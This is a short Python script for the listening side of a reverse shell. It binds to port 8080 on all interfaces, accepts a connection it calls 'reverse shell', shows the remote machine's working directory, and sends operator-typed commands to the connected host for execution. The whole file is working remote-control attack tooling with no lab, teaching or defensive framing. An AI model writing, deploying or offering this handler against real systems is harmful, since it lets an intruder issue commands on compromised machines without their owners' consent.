import socket

def start_server():
    s = socket.socket()
    s.settimeout(1)
    print("")
    print("Socket created.")
    
    s.bind(('0.0.0.0', 8080))
    print("Socket binded to 8080")
    print("")
    s.listen(5)
    print("Socket is listening...")
    while True:
        try:
            conn, addr = s.accept()
            print("Got connection from reverse shell in ", addr)
            while s:
                try:
                    cwd = conn.recv(1024).decode()
                    if len(cwd)==0:
                        print("")
                        print("Client must have disconnected. len(cwd) == 0.")
                        break
                    print(cwd)
                    command = input(f"{cwd}> ")
                    print("command is ", command.encode())
                    conn.send(command.encode())
                except:
                    print("Client must have disconnected.")
                    break
        except socket.timeout:
            continue

if __name__ == "__main__":
    start_server()